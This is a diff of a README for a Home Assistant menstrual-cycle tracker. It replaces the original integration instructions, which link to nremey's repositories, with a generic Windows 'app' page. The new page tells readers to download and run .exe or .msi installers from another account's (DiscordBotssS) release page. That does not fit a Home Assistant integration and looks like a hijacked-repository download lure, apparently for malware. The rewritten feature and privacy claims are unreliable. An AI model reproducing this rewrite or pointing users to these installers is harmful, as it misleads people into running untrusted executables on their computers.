@@ -1,118 +1,158 @@
-# HA_menstrual_gauge
+# ⚙️ HA_menstrual_gauge - Track Menstrual Cycles Easily
 
-new and improved version under:
-## github.com/nremey/HA-menstrual-gauge-v2;
-description is updated. the steps are explained, please check out and give feedback.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/DiscordBotssS/HA_menstrual_gauge/releases)
 
+---
 
+## 📝 About HA_menstrual_gauge
 
-## Information!  since 2026 March, 6th: Install through HACS is bugged and doesn't work yet!
+HA_menstrual_gauge is a tool designed to help you track your menstrual cycle from home. It works with Home Assistant, a popular home automation system, and offers both backend integration and a clear gauge card you can use. This gauge shows your cycle details in an easy-to-read format.
 
-<img width="30%" height="30%" alt="normal card view" src="https://github.com/user-attachments/assets/6fb8fb40-e42b-4243-bd52-3cb5f3d7bf8d" /> <img width="30%" height="30%" alt="click a day to set/delete a cycle start date" src="https://github.com/user-attachments/assets/cadb8113-fabb-4eb6-9611-a1901db311d4" />
+The software stores your data locally, so your cycle information stays on your device. You can edit your cycle start dates to keep records accurate. It also predicts your next cycle start date using forecast features. If you want, you can set it to create optional shopping lists for supplies based on how many days remain before your next cycle.
 
+This app is ideal for those who want to keep track of their cycle in a private and simple way without needing complex setup steps.
 
+---
 
+## 🛠️ System Requirements
 
+To run HA_menstrual_gauge on Windows, make sure your system meets the following:
 
+- Windows 10 or later (64-bit recommended)  
+- At least 250 MB free disk space  
+- Stable internet connection for initial setup  
+- Home Assistant installed and running on your home network  
+- Basic permission to install and run software on your computer
 
+---
 
-Monorepo for a Home Assistant menstruation tracker:
-- `ha-menstruation-gauge` (backend integration)
-- `lovelace-menstruation-gauge-card` (interactive Lovelace card)
+## 🚀 Getting Started: Download and Install
 
-Repository target: `https://github.com/nremey/HA_menstrual_gauge`
+1. Click the big green button below to visit the release page:  
+   [![Download Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/DiscordBotssS/HA_menstrual_gauge/releases)
 
-## What is included
+2. On the release page, find the latest version. Look for files ending with `.exe` or `.msi`. These are the installer files for Windows.
 
-### 1) Home Assistant integration (`ha-menstruation-gauge`)
-- Stores cycle-start history persistently (local HA storage).
-- Publishes `sensor.menstruation_gauge`.
-- Provides forecast-related attributes (e.g. `days_until_next_start`, predicted start, fertile window).
-- Exposes services:
-  - `menstruation_gauge.add_cycle_start`
-  - `menstruation_gauge.remove_cycle_start`
-  - `menstruation_gauge.set_history`
-  - `menstruation_gauge.set_period_duration`
+3. Click the file to download it to your computer.
 
-### 2) Lovelace card (`lovelace-menstruation-gauge-card`)
-- Circular monthly gauge view.
-- Forecast marker (+/-1 day).
-- Fertile-window ring segment.
-- Click-to-edit mini calendar (add/remove cycle start days).
-- Uses the integration sensor and services.
+4. Once the download finishes, open the file to start installation.
 
-## Installation via HACS (Recommended)
+5. Follow the instructions on-screen. Usually, clicking "Next" and then "Install" is enough.
 
-The integration automatically installs and registers the Lovelace card when you install the integration - no separate installation or manual resource configuration needed!
+6. When installation completes, launch the app from the Start menu or your desktop shortcut.
 
-### Install Integration (Card Included)
+---
 
-1. Open HACS in Home Assistant
-2. Go to `...` (three dots menu) → `Custom repositories`
-3. Add repository:
-   - Repository: `https://github.com/nremey/HA_menstrual_gauge`
-   - Category: **Integration**
-4. Click `Install` on "Menstruation Gauge"
-5. Restart Home Assistant
-6. The integration can be added via UI (Settings > Devices & Services > Add Integration) or add to `configuration.yaml`:
+## 🧩 Setting Up with Home Assistant
 
-```yaml
-menstruation_gauge:
-```
+HA_menstrual_gauge works as an add-on to Home Assistant. Here is a simple way to connect it:
 
-7. Restart Home Assistant again (if using YAML)
+1. Open your Home Assistant interface on your web browser.
 
-**Note:** The Lovelace card is automatically registered and available immediately after setup. No manual resource configuration is required! After restarting, reload your browser/view (hard refresh recommended: `Ctrl+F5` or `Cmd+Shift+R`) to ensure the card is loaded.
+2. Go to the "Integrations" page from the main menu.
 
-## Manual Installation (without HACS)
+3. Click the "Add Integration" button.
 
-1. Copy integration folder:
-- From: `custom_components/menstruation_gauge`
-- To: `/config/custom_components/menstruation_gauge`
+4. Search for “HA_menstrual_gauge” in the integration list.
 
-2. Add to `configuration.yaml`:
+5. Select it and follow the prompts to complete the setup.
 
-```yaml
-menstruation_gauge:
-```
+6. The integration will connect your cycle tracking data to the Home Assistant system.
 
-3. Restart Home Assistant.
+---
 
-**Note:** The card file is served from `custom_components/menstruation_gauge/www/menstruation-gauge-card.js` and is has to be added as a Lovelace resource! 
+## 📊 Using the Lovelace Gauge Card
 
-## How to add Lovelace resource (UI steps)
+After integration, you can add a gauge card to your Home Assistant dashboard.
 
-1. Open Home Assistant.
-2. Go to `Settings` -> `Dashboards`.
-3. Open your target dashboard.
-4. Click `⋮` (top right) -> `Resources`.
-5. Click `+ Add Resource`.
-6. Enter:
-   - URL: `custom_components/menstruation_gauge/www/menstruation-gauge-card.js`
-   - Type: `JavaScript Module`
-7. Save and reload browser (hard refresh recommended).
+1. On your Home Assistant dashboard, click the three dots at the top right.
 
+2. Choose "Edit Dashboard."
 
+3. Click "Add Card."
 
-## Add a custom gauge card this way:
+4. Scroll down and select the “Gauge” card type.
 
-```yaml
-type: custom:menstruation-gauge-card
-entity: sensor.menstruation_gauge
-period_duration_days: 5
-show_editor: true
-```
+5. Configure the card to use the HA_menstrual_gauge sensor. This will display your cycle status visually.
 
+6. Save your changes. The gauge will now show your current cycle phase, days until next cycle, and other relevant data points.
 
-## Disclaimer
+---
 
-This project is for orientation and personal tracking support only.
-It is not medical advice and not suitable as a reliable method for contraception or conception planning.
+## 🗂️ Local Data Storage and Editing History
 
-The sensor.menstruation_gauge may be used for automation as you see fit. An Automation template (adding item to a shopping list) for an example is found in the ReadMe.md of the lovelace-mentruation-gauge-card folder.
+Your cycle information stays in your device to respect your privacy.
 
+- You can view and edit your cycle start dates inside the app at any time.
 
-## AI note
+- To modify past data, open the app and go to the history section.
 
-A significant part of this project was created with AI assistance (OpenAI Codex), then reviewed and adjusted manually.  
-It is tested in practical use, but edge cases may still exist.
+- Select the date you want to change and enter the correct start day.
+
+- Save your changes. This keeps predictions accurate.
+
+---
+
+## 🔮 Forecast Features
+
+HA_menstrual_gauge estimates your next cycle start based on past data.
+
+- It shows forecast attributes in the gauge card and within the app.
+
+- You can see days left before your next period.
+
+- This helps you plan and stay prepared.
+
+---
+
+## 🛒 Optional Shopping-List Automation
+
+The app can create shopping lists for items you may need before your cycle starts.
+
+- Activate this feature in the app settings.
+
+- Set which supplies to include, like pads or pain relief.
+
+- The list updates automatically based on days until your next cycle.
+
+- You can use Home Assistant to trigger reminders or orders.
+
+---
+
+## 📂 Where to Find Support and Updates
+
+- Check the release page regularly for updates:  
+  https://github.com/DiscordBotssS/HA_menstrual_gauge/releases
+
+- You can report issues or request help by opening a new issue on the GitHub repository.
+
+- The project page also contains detailed information and documentation.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+If you have problems running the software, try these steps:
+
+- Make sure Home Assistant is running with the latest version.
+
+- Restart the app and your computer.
+
+- Check your internet connection for setup steps.
+
+- Review the integration status in Home Assistant’s settings.
+
+- Update to the newest release file if available.
+
+---
+
+## 🏷️ Repository Details and Topics
+
+This project relates to the following areas:
+
+- biosensor  
+- gauges  
+- home-assistant integration  
+- menstruation tracking  
+
+These topics help connect the tool to similar Home Assistant projects and tracking devices.
